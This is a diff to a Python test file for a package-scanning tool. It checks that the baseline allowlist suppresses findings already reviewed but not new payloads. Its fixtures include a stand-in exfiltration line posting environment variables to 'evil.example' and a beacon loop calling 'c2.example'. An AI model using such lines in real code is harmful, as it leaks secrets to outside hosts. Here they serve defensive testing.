@@ -322,18 +322,42 @@ def test_proc_self_status_pattern_is_live():
     assert not sp.RE_ANTI_ANALYSIS.search("if platform.system() == 'Linux': pass")
 
 
-def _mk(sev, pkg, fname, check):
-    return sp.Finding(sev, pkg, fname, check, "evidence")
+def _mk(sev, pkg, fname, check, evidence = "evidence"):
+    return sp.Finding(sev, pkg, fname, check, evidence)
 
 
 def test_baseline_key_version_stable_but_path_specific():
     a = _mk(sp.CRITICAL, "requests", "requests-2.32.5/requests/sessions.py", "X")
     b = _mk(sp.CRITICAL, "Requests", "requests-3.0.0/requests/sessions.py", "X")
-    # Same package-relative path across versions -> same key (stable).
+    # Same package-relative path + same matched code across versions -> same key.
     assert sp._finding_key(a) == sp._finding_key(b)
     # Same basename in a different path -> different key (no over-suppression).
     c = _mk(sp.CRITICAL, "requests", "requests-2.32.5/requests/vendor/sessions.py", "X")
     assert sp._finding_key(a) != sp._finding_key(c)
+
+
+def test_baseline_key_line_shift_stable_but_code_specific():
+    # The evidence hash strips ``L<NN>:`` markers, so a benign upstream edit that
+    # only shifts line numbers keeps the key stable...
+    base = _mk(
+        sp.CRITICAL, "botocore", "botocore/utils.py",
+        "Harvests environment variables/secrets AND makes network calls",
+        "Env: L417: env = os.environ.copy()\nNetwork: L32: from urllib.request import getproxies",
+    )
+    shifted = _mk(
+        sp.CRITICAL, "botocore", "botocore/utils.py",
+        "Harvests environment variables/secrets AND makes network calls",
+        "Env: L612: env = os.environ.copy()\nNetwork: L48: from urllib.request import getproxies",
+    )
+    assert sp._finding_key(base) == sp._finding_key(shifted)
+    # ...but a NEW payload in the same file/check (different matched code) does
+    # not inherit the suppression -- this is the supply-chain bypass we close.
+    malicious = _mk(
+        sp.CRITICAL, "botocore", "botocore/utils.py",
+        "Harvests environment variables/secrets AND makes network calls",
+        "Env: L417: env = os.environ.copy()\nNetwork: requests.post('https://evil.example/exfil', data=env)",
+    )
+    assert sp._finding_key(base) != sp._finding_key(malicious)
 
 
 def test_fstring_statement_is_not_blanked():
@@ -417,11 +441,14 @@ def test_comment_only_network_exec_not_flagged():
 
 def test_baseline_suppresses_listed_but_not_new_check(tmp_path):
     bl = tmp_path / "bl.json"
-    listed = _mk(sp.CRITICAL, "fastapi", "fastapi/routing.py", "C2 polling/beaconing loop detected")
+    listed = _mk(
+        sp.CRITICAL, "fastapi", "fastapi/routing.py", "C2 polling/beaconing loop detected",
+        "L579: while True:",
+    )
     sp._write_baseline(str(bl), [listed])
     baseline = sp._load_baseline(str(bl))
 
-    # Same (package, basename, check) -> suppressed.
+    # Same (package, path, check, matched code) -> suppressed.
     active, suppressed = sp._partition_baseline([listed], baseline)
     assert suppressed == [listed] and active == []
 
@@ -431,6 +458,23 @@ def test_baseline_suppresses_listed_but_not_new_check(tmp_path):
     )
     active2, suppressed2 = sp._partition_baseline([new_kind], baseline)
     assert active2 == [new_kind] and suppressed2 == []
+
+    # Same file + same check but CHANGED flagged code -> still active. A future
+    # malicious payload cannot ride a previously reviewed entry's suppression.
+    changed_code = _mk(
+        sp.CRITICAL, "fastapi", "fastapi/routing.py", "C2 polling/beaconing loop detected",
+        "L579: while True: requests.get('http://c2.example/beacon')",
+    )
+    active3, suppressed3 = sp._partition_baseline([changed_code], baseline)
+    assert active3 == [changed_code] and suppressed3 == []
+
+    # A benign line shift of the SAME code stays suppressed (no version churn).
+    shifted = _mk(
+        sp.CRITICAL, "fastapi", "fastapi/routing.py", "C2 polling/beaconing loop detected",
+        "L640: while True:",
+    )
+    active4, suppressed4 = sp._partition_baseline([shifted], baseline)
+    assert suppressed4 == [shifted] and active4 == []
 
 
 def test_write_baseline_roundtrip_only_crit_high(tmp_path):
@@ -449,6 +493,53 @@ def test_write_baseline_roundtrip_only_crit_high(tmp_path):
 
 def test_load_baseline_missing_file_is_empty():
     assert sp._load_baseline("/nonexistent/path/bl.json") == set()
+
+
+def test_committed_baseline_suppresses_known_but_not_a_new_payload():
+    """End-to-end against the shipped allowlist: a reviewed benign finding stays
+    suppressed, but a NEW malicious payload in the same baselined file/check is
+    not (closes the supply-chain bypass where a future botocore/utils.py payload
+    rode the existing CRITICAL entry)."""
+    import json
+
+    baseline_path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
+    entries = json.loads(baseline_path.read_text())["entries"]
+    target = next(
+        e for e in entries
+        if e["package"] == "botocore"
+        and e["file"] == "botocore/utils.py"
+        and e["check"] == "Harvests environment variables/secrets AND makes network calls"
+    )
+    baseline = sp._load_baseline(str(baseline_path))
+
+    # The exact reviewed finding is suppressed.
+    benign = _mk(target["severity"], target["package"], target["file"], target["check"], target["evidence"])
+    active, suppressed = sp._partition_baseline([benign], baseline)
+    assert suppressed == [benign] and active == []
+
+    # A future malicious version: same file, same check, new exfil code. Must
+    # remain ACTIVE so the enforcing gate (exit 1) still trips.
+    malicious = _mk(
+        target["severity"], target["package"], target["file"], target["check"],
+        "Env: L417: env = os.environ.copy()\nNetwork: requests.post('https://evil.example/exfil', data=env)",
+    )
+    active2, suppressed2 = sp._partition_baseline([malicious], baseline)
+    assert active2 == [malicious] and suppressed2 == []
+
+
+def test_committed_baseline_entries_all_carry_evidence_hash():
+    """Every shipped entry must pin an evidence_hash; an entry without one would
+    silently fall back to the coarse legacy match for that file/check."""
+    import json
+
+    baseline_path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
+    entries = json.loads(baseline_path.read_text())["entries"]
+    assert entries, "committed baseline should not be empty"
+    missing = [f"{e['package']}:{e['file']}:{e['check']}" for e in entries if not e.get("evidence_hash")]
+    assert not missing, f"entries missing evidence_hash: {missing[:5]}"
+    # And each pinned hash matches a recompute from the stored evidence.
+    for e in entries:
+        assert e["evidence_hash"] == sp._evidence_hash(e["evidence"]), e["file"]
 
 
 # sdist fallback: cover sdist-only packages without building. All offline
